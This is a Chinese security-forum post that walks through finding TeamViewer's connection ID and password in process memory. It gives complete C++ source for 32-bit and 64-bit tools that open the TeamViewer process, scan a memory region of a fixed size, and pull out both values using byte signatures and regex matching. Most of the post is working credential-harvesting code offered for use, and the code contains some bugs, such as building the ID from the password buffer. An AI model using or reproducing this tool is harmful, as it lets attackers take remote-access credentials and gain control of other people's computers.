最近看到用窗体得到TV的账号密码在最新版不能用了

于是就想写个工具实现一下通过内存得到账号密码

0x01 通过CE搜索账号密码存在的内存块
---------------------

类型设置为文本，选择unicode编码，多搜索几次找到这个值

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-cee5b5cfc809e9f79b87b64752845f48a5532f8f.png)

本来想的是应该有个指针直接指向密码，想把这个指针的基址找到就可以了，但是调了一下好像找不到这个基址

还有ID是不可以修改的，定位也不方便，想到遍历内存来得到ID和密码

再用CE搜索一下ID

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-6552de03131cbd86064ecbc8fca2beb682cbd2c5.png)

可以看到在密码的附近都是有很多ID

用的是遍历可以不用知道具体的位置，剩下的就是要思考怎么让遍历的内存更准确，遍历0000000-7FFF0000肯定是可以的，但是这样会出现很多误报，因为后面是准备使用正则匹配的，难免会匹配到别的字符串

先用x32dbg查看下内存的属性

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-1449684b22d5daa6542c28d2264e009f0225eb9a.png)

从CE上看ID和密码就在这块内存里面，这里有个特征就是这块内存的大小是1FF000，后面会用到

那么思路就是先得到进程的基址，然后遍历所有内存块基址，找到一个1FF000大小的内存，遍历内部内容，得到ID密码，这样遍历的内存也不会很大，也可以降低匹配误差

0x02 需要用到的函数和结构
---------------

下面介绍一下需要用到的函数和结构

### ZwQueryVirtualMemory

```c++
typedef NTSTATUS(WINAPI* fnZwQueryVirtualMemory) (
    HANDLE ProcessHandle,               //进程句柄
    PVOID BaseAddress,                  //内存地址
    MEMORY_INFORMATION_CLASS MemoryInformationClass,        //选择需要的内存信息，下面介绍
    PVOID MemoryInformation,            //指向MEMORY_BASIC_INFORMATION结构的指针
    SIZE_T MemoryInformationLength,     //MEMORY_BASIC_INFORMATION结构的大小
    PSIZE_T ReturnLength                //返回结构的大小
);
```

这个函数就是获取内存块的属性然后存放到MEMORY\_BASIC\_INFORMATION结构

### MemoryInformationClass

```c++
typedef enum _MEMORY_INFORMATION_CLASS {
    MemoryBasicInformation,
    MemoryWorkingSetList,
    MemorySectionName,
    MemoryBasicVlmInformation
} MEMORY_INFORMATION_CLASS;
```

这是一个枚举类型，选择需要什么内存信息，这里需要遍历内存选择MemoryBasicInformation就可以

### MEMORY\_BASIC\_INFORMATION

```c++
typedef struct _MEMORY_BASIC_INFORMATION {
    PVOID BaseAddress;              //内存块的起始地址
    PVOID AllocationBase;           //指向VirtualAlloc函数等开辟的内存的地址的指针
    DWORD AllocationProtect;
    //内存块的初始属性,打个比方开了一块内存赋予RW属性，就算后面用VirtualProtect修改为RWX这里也是RW，是这个内存初始时候的属性
#if defined (_WIN64)
    WORD   PartitionId;             //不知道，msdn没写
#endif
    SIZE_T RegionSize;              //内存块的大小
    DWORD State;                    //内存块的状态
    DWORD Protect;                  //内存块当前的属性
    DWORD Type;                     //内存块的类型
} MEMORY_BASIC_INFORMATION, *PMEMORY_BASIC_INFORMATION;
```

### EnumProcessModules

```c++
BOOL WINAPI EnumProcessModules(
    _In_ HANDLE hProcess,           //进程的句柄
    _Out_writes_bytes_(cb) HMODULE* lphModule,      //存放模块的数组
    _In_ DWORD cb,                  //数组的大小
    _Out_ LPDWORD lpcbNeeded        //所有模块的存储在lphModule中的字节数
);
```

这个函数主要是用来找到进程的基地址

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-2a9584014afb1340703a79533e15539186eac410.png)

可以看到进程的基地址是偏向上面的，只要往下遍历就好

0x03 实现过程
---------

1. EnumProcessModules得到进程的基地址
2. 用do...while循环配合ZwQueryVirtualMemory得到内存块属性，如果不是1FF000就加上内存块的大小跳到下一个内存块，如果是的话直接得到模块的基地址然后遍历这个模块的内存
3. 用ReadProcessMemory将内存读出来
4. 用正则表达式加特征匹配内存中的字符

关于最后一点的特征，光知道大小只能定位模块，还需要知道一些ID密码附近的内存特征

发现ID的前面会有个0x80，后面会用0x00，0x00结尾

密码前面有0x88，用0x00，0x00结尾

还有一个坑点就是unicode的正则表达式匹配，没找到特别好的方法

还好这里都是英文和数字，只要取出13579位置的值然后放入一个char类型的数组中，就可以用正则匹配了

如下

```php
35 00 72 00 6A 00 32 00 61 00 6D 00 35 00 61 00
5rj2am5a                unicode
取出1 3 5 7 9 11 13 15存入char类型的数组就可以用正则了
```

0x04 代码实现 x32
-------------

```c++
#include<stdio.h>
#include<Windows.h>
#include <dbghelp.h>
#pragma comment(lib,"dbghelp.lib")
#include <shlwapi.h>
#include "tlhelp32.h"
#include <psapi.h>
#include <regex>

#if _WIN64
_int64 EndAddress = 0x0007FFFFFFFF0000;
#else
int EndAddress = 0X7FFF0000;
#endif                          //根据位数不同遍历的地址大小不同
using namespace std;

typedef enum _MEMORY_INFORMATION_CLASS {
    MemoryBasicInformation,
    MemoryWorkingSetList,
    MemorySectionName,
    MemoryBasicVlmInformation
} MEMORY_INFORMATION_CLASS;

typedef NTSTATUS(WINAPI* fnZwQueryVirtualMemory) (
    HANDLE ProcessHandle, 
    PVOID BaseAddress, 
    MEMORY_INFORMATION_CLASS MemoryInformationClass, 
    PVOID MemoryInformation, 
    SIZE_T MemoryInformationLength, 
    PSIZE_T ReturnLength
    );

int GetPidByName(PCWCHAR procName) {
    HANDLE ProcessId = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    if (ProcessId == NULL) {
        printf("Fail");
    }
    PROCESSENTRY32 te32 = { 0 };
    te32.dwSize = sizeof(te32);
    int number = 0;
    if (Process32First(ProcessId, &te32)) {
        do {
            if (!lstrcmp(te32.szExeFile, procName)) {
                //printf("[+] TeamViewer PID: %d", te32.th32ProcessID);
                return te32.th32ProcessID;
            }
        } while (Process32Next(ProcessId, &te32));
    }
}               //用进程名得到PID

int main() {
    MEMORY_BASIC_INFORMATION mbi = { 0 };               //初始化MEMORY_BASIC_INFORMATION结构
    fnZwQueryVirtualMemory ZwQueryVirtualMemory = (fnZwQueryVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "ZwQueryVirtualMemory");
    //ndtll.dll得到ZwQueryVirtualMemory

    if (ZwQueryVirtualMemory == NULL) {
        if (ZwQueryVirtualMemory == NULL)
        {
            printf("没有找到ZwQueryVirtualMemory函数");
            system("pause");
            return 0;
        }
    }
    //如果为NULL就是没找到
    DWORD cbNeeded;             //EnumProcessModules参数
    HMODULE pModuleIds[1024];   //EnumProcessModules存放模块的数组
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, GetPidByName(L"TeamViewer.exe"));
    //TeamViewer.exe进程句柄
    EnumProcessModules(hProcess, pModuleIds, sizeof(pModuleIds), &cbNeeded);
    int StartAddress = (int)pModuleIds[0];
    printf("[+]PEBaseAddress: %p\n", StartAddress);     //找到TeamViewer.exe基地址

    do {
        ZwQueryVirtualMemory(hProcess, (LPVOID)StartAddress, MemoryBasicInformation, &mbi, sizeof(mbi), NULL);                  //从基地址开始遍历，将内存信息存放MEMORY_BASIC_INFORMATION结构
        if (mbi.RegionSize == 0x1FF000) {               //查看内存大小是否为1FF000
            int id_temp = 0;                        //临时变量，找到了就改为1，避免重复读取
            char password_temp = 0;                 //同上
            printf("[+]BaseAddress: %p\n", mbi.BaseAddress);            //模块基地址
            for (int i = 0; i < 0x1FF000; i++) {
                char id[0x17];                          //存放id的char数组，因为是unicode字符所以要双倍大小加上前面的0x80和后面的0x00，0x00
                char id_char[0xA] = {0};                //unicode转换为ASCII存放的数组
                char password[0x15];                    //存放密码的unicode数组，加上前面的0x88和后面的0x00，0x00
                char password_char[0x9] = {0};          //同上
                ReadProcessMemory(hProcess, (LPVOID)((int)mbi.BaseAddress + i), password, 0x15, NULL);
                ReadProcessMemory(hProcess, (LPVOID)((int)mbi.BaseAddress + i), id, 0x17, NULL);
                //内存中读出数据
                for (int x = 0; x <= 0x8; x++) {
                    password_char[x] = password[ x * 2 + 2 ];
                }
                //将0x00去除写入password_char数组
                password_char[8] = '\x00';          //最后加上\x00结尾
                if (password[1] == 0xffffff88 && password[17] == 0 && password[18] == 0  &&  regex_match(password_char, regex("[0-9a-z]{8}"))) {
                    printf("[+]password: %s\n", password_char);
                    password_temp = 1;
                }
                //判断password[1]是否为0x88，17,18位是否为00，最后正则匹配password_char
                for (int x = 0; x <= 0x9; x++) {
                    id_char[x] = password[x * 2 + 2];
                }
                //同上
                id_char[9] = '\x00';
                if (id_temp == 0 && id[1] == 0xffffff80 && id[19] == 0 && id[20] == 0 && regex_match(id_char, regex("[0-9]{9}"))) {
                    printf("[+]id: %s\n", id_char);
                    id_temp = 1;
                }
                //这里和上面差不多，id_temp == 0 是因为ID会出现多个相同的值，所以只要取到一次就不用再取了
                if (id_temp == 1 && password_temp == 1) {
                    break;
                }
                //如果id_temp和password_temp都为1说明已经都取到了就可以跳出循环了
            }
            break;
        }
        StartAddress += mbi.RegionSize;             //不是就加上当前内存块大小继续遍历
    } while (StartAddress <= EndAddress);
}
```

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-077be43d4d69a3a8cefc456749787b9d146c0dbb.png)

0x05 代码实现 x64
-------------

64位中线程的内存地址都比进程基址小了，就是存有ID密码的内存都到进程上面了

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-89ff731e0adcb4e3d75c02646a7e26cf394b0a4d.png)

都是7FFE0000开始，这样就不用先得到进程基址，可以直接遍历

还有在64位中密码开头的数字变成了0x90，这也是需要改下的，别的基本都是相同的

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-d13085f352250d13f0003fc20797e800545d7f1f.png)  
贴一下修改后的代码

```c++
#include<stdio.h>
#include<Windows.h>
#include <dbghelp.h>
#pragma comment(lib,"dbghelp.lib")
#include <shlwapi.h>
#include "tlhelp32.h"
#include <psapi.h>
#include <regex>

#if _WIN64
_int64 EndAddress = 0x0007FFFFFFFF0000;
#else
int EndAddress = 0X7FFF0000;
#endif                          //根据位数不同遍历的地址大小不同
using namespace std;

typedef enum _MEMORY_INFORMATION_CLASS {
    MemoryBasicInformation,
    MemoryWorkingSetList,
    MemorySectionName,
    MemoryBasicVlmInformation
} MEMORY_INFORMATION_CLASS;

typedef NTSTATUS(WINAPI* fnZwQueryVirtualMemory) (
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    MEMORY_INFORMATION_CLASS MemoryInformationClass,
    PVOID MemoryInformation,
    SIZE_T MemoryInformationLength,
    PSIZE_T ReturnLength
    );

int GetPidByName(PCWCHAR procName) {
    HANDLE ProcessId = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    if (ProcessId == NULL) {
        printf("Fail");
    }
    PROCESSENTRY32 te32 = { 0 };
    te32.dwSize = sizeof(te32);
    int number = 0;
    if (Process32First(ProcessId, &te32)) {
        do {
            if (!lstrcmp(te32.szExeFile, procName)) {
                printf("[+]TeamViewer PID: %d\n", te32.th32ProcessID);
                return te32.th32ProcessID;
            }
        } while (Process32Next(ProcessId, &te32));
    }
}               //用进程名得到PID

int main() {
    MEMORY_BASIC_INFORMATION mbi = { 0 };               //初始化MEMORY_BASIC_INFORMATION结构
    fnZwQueryVirtualMemory ZwQueryVirtualMemory = (fnZwQueryVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "ZwQueryVirtualMemory");
    //ndtll.dll得到ZwQueryVirtualMemory

    if (ZwQueryVirtualMemory == NULL) {
        if (ZwQueryVirtualMemory == NULL)
        {
            printf("没有找到ZwQueryVirtualMemory函数");
            system("pause");
            return 0;
        }
    }
    //如果为NULL就是没找到

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, GetPidByName(L"TeamViewer.exe"));
    _int64 StartAddress = 0x000000007FFE0000;

    do {
        ZwQueryVirtualMemory(hProcess, (LPVOID)StartAddress, MemoryBasicInformation, &mbi, sizeof(mbi), NULL);                  //从基地址开始遍历，将内存信息存放MEMORY_BASIC_INFORMATION结构
        if (mbi.RegionSize == 0x1FF000) {               //查看内存大小是否为1FF000
            int id_temp = 0;                        //临时变量，找到了就改为1，避免重复读取
            char password_temp = 0;                 //同上
            for (int i = 0; i < 0x1FF000; i++) {
                char id[0x17];                          //存放id的char数组，因为是unicode字符所以要双倍大小加上前面的0x80和后面的0x00，0x00
                char id_char[0xA] = { 0 };              //unicode转换为ASCII存放的数组
                char password[0x15];                    //存放密码的unicode数组，加上前面的0x88和后面的0x00，0x00
                char password_char[0x9] = { 0 };            //同上
                ReadProcessMemory(hProcess, (LPVOID)((_int64)mbi.BaseAddress + i), password, 0x15, NULL);
                ReadProcessMemory(hProcess, (LPVOID)((_int64)mbi.BaseAddress + i), id, 0x17, NULL);
                //内存中读出数据
                for (int x = 0; x <= 0x8; x++) {
                    password_char[x] = password[x * 2 + 2];
                }
                //将0x00去除写入password_char数组
                password_char[8] = '\x00';          //最后加上\x00结尾
                if (password[1] == 0xffffff90 && password[17] == 0 && password[18] == 0 && regex_match(password_char, regex("[0-9a-z]{8}"))) {
                    printf("[+]password: %s\n", password_char);
                    password_temp = 1;
                }
                //判断password[1]是否为0x88，17,18位是否为00，最后正则匹配password_char
                for (int x = 0; x <= 0x9; x++) {
                    id_char[x] = password[x * 2 + 2];
                }
                //同上
                id_char[9] = '\x00';
                if (id_temp == 0 && id[0] == 0x20 && id[19] == 0 && id[20] == 0 && regex_match(id_char, regex("[0-9]{9}"))) {
                    printf("[+]id: %s\n", id_char);
                    id_temp = 1;
                }
                //这里和上面差不多，id_temp == 0 是因为ID会出现多个相同的值，所以只要取到一次就不用再取了
                if (id_temp == 1 && password_temp == 1) {
                    break;
                }
                //如果id_temp和password_temp都为1说明已经都取到了就可以跳出循环了
            }
            break;
        }
        StartAddress += mbi.RegionSize;             //不是就加上当前内存块大小继续遍历
    } while (0 <= StartAddress);
}
```

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-a79774acd10b864f1a97ca934c521143fabe3b85.png)